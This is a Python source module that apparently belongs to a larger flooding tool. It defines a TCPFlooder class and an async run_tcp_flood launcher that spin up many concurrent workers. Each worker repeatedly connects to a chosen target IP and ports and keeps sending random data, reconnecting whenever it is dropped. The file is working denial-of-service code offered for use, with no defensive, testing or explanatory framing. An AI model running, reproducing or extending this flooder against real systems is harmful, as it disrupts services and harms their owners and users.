from ..utils.ulog import log
import asyncio
from typing import List, Optional, Tuple
import socket
from concurrent.futures import ThreadPoolExecutor
import multiprocessing
import os
from contextlib import suppress

from ..src.cpu_manager import CPUManager

SOCK_BUFF_SIZE = 1024 * 1024
MAX_HTTP_PACKET_SIZE = 16 * 1024 * 1024
DEFAULT_CONCURRENT_WORKERS = multiprocessing.cpu_count()


class TCPFlooder:
    def __init__(
            self,
            target_ip: str,
            ports: List[int],
            concurrency: int,
    ):
        
        self.target_ip = target_ip
        self.ports = ports
        self.concurrency = concurrency


    async def __aenter__(self):
        log.info("Entering TCPFlooder context manager.")
        return self
    
    async def __aexit__(self, exc_type, exc, tb):
        log.info("Exiting TCPFlooder context manager.")
        pass


    async def tcp_flood_worker(
            self,
            port: int,
            worker_id: int,
    ) -> None:
        pid = os.getpid()
        log.info(f"[Worker {worker_id} | PID {pid}] Starting TCP flood on port {port}...")


        while True:
            sock: Optional[socket.socket] = None
            try:
                sock = socket.socket(
                    socket.AF_INET,
                    socket.SOCK_STREAM,
                )
                log.info(f"[Worker {worker_id}] Attempting connection...")
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, SOCK_BUFF_SIZE)
                sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, SOCK_BUFF_SIZE)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

                loop = asyncio.get_event_loop()


                try:
                    packet_count = 0
                    await asyncio.wait_for(
                        loop.sock_connect(
                            sock,
                            (self.target_ip, port)
                        ),
                        # timeout=5.0
                    )
                    log.info(f"[TCP Worker {worker_id}] Connected to {self.target_ip}:{port}")
                    while True:
                        try:
                            await loop.sock_sendall(
                                sock,
                                os.urandom(1024)
                            )
                            packet_count += 1
                            if packet_count % 10 == 0:
                                log.info(f"[TCP Worker {worker_id}] Sent packet to {self.target_ip}:{port}")
                            await asyncio.sleep(0.01)
                        except (ConnectionError, BrokenPipeError, OSError):
                            log.info(f"[TCP Worker {worker_id}] Connection closed by target {self.target_ip}:{port}")
                            break



                except asyncio.TimeoutError:
                    log.debug(f"[TCP Worker {worker_id}] Connection timeout to {self.target_ip}:{port}")

            except asyncio.TimeoutError:
                log.debug(f"[TCP Worker {worker_id}] Timeout to connect {self.target_ip}:{port}")
            except asyncio.CancelledError:
                log.info(f"[TCP Worker {worker_id}] Cancell task.")
                break
            except Exception as e:
                log.debug(f"[TCP Worker {worker_id}] Error: {e}")
                await asyncio.sleep(0.1)
            finally:
                try:
                    sock.close()
                except:
                    pass


        
#     async def start_tcp_flood(self) -> None:
#         tasks = []

#         ports_count = len(self.ports)
#         workers_per_port = max(1, self.concurrency // max(1, ports_count))


#         for port in self.ports:
#             for i in range(workers_per_port):
#                 worker_id = len(tasks) 
#                 task = asyncio.create_task(
#                     self.tcp_flood_worker(port, worker_id),
#                     name=f"tcp_worker_{port}_{i}"
#                 )
#                 tasks.append(task)
#         try:
#             await asyncio.gather(*tasks, return_exceptions=True)
#         except KeyboardInterrupt:
#             log.info("TCP flood interrupted by user.")
#             for task in tasks:
#                 task.cancel()
            
#             with suppress(asyncio.CancelledError):
#                 await asyncio.gather(*tasks, return_exceptions=True)
    

# async def run_tcp_flood(
#         target_ip: str,
#         ports: List[int],
#         concurrency: int
# ) -> None:
#     log.warning(f"Starting TCP flood on {target_ip} ports {ports} with {concurrency} workers.")

#     CPUManager.randomize_cpu()


#     flooder = TCPFlooder(target_ip, ports, concurrency)
#     await flooder.start_tcp_flood()



async def run_tcp_flood(
        target_ip: str,
        ports: List[int],
        concurrency: int
        
) -> None:
    log.warning(f"Starting TCP flood on {target_ip} ports {ports}.")


    CPUManager.randomize_cpu()

    async with TCPFlooder(
        target_ip,
        ports,
        concurrency,
    ) as flooder:

        tasks = [
            asyncio.create_task(
                flooder.tcp_flood_worker(
                    port=ports[i % len(ports)],
                    worker_id=i,
                ),
                name=f"tcp_worker_{i}"
            )

            for i in range(concurrency)
        ]
        

        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except KeyboardInterrupt:
            log.warning("Received exit signal. Cancelling tasks...")
            for task in tasks:
                task.cancel()

            with suppress(
                asyncio.CancelledError
            ):
                await asyncio.gather(*tasks, return_exceptions=True)
